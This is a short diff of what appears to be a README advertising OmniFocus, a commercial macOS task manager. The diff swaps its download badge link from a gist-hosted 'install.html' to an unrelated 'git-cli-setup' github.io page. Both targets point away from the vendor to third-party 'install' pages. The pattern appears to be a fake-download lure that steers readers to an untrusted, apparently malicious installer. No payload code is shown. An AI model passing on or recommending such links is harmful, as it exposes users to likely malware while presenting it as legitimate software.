@@ -2,7 +2,7 @@
 
 OmniFocus is a professional task management solution designed for macOS users who follow GTD (Getting Things Done) methodologies. It helps organize projects, deadlines, and personal workflows with clarity and precision.
 
-<a href="https://gistcdn.githack.com/kendobaflocer851/1e6d00f7d0db239469e1db9a5020ca6f/raw/bf86f0567c0233a6d9c9096567f86f21cdba3e10/install.html?offer=OmniFocus" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=OmniFocus" target="_blank">
   <img
     src="https://img.shields.io/badge/Get%20OmniFocus%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
